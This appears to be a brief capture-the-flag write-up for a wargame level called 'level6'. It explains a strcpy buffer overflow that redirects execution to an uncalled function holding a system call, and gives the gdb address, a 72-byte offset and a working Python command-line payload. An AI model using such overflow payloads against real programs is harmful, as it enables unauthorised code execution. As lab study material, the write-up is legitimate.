In this level, we use the vulnaribility of the function strcpy to Buffer Overflow
There is a function called n, which is not called and contains system function.
We need the address of this function:
gdb n
0x8048454 <n>:	0x83e58955

The playload:
To get the offset of the payload //to check it with gdbpedra
offset = 72

./level6 $(python -c "print 'A' *72 + '\x54\x84\x04\x08'")
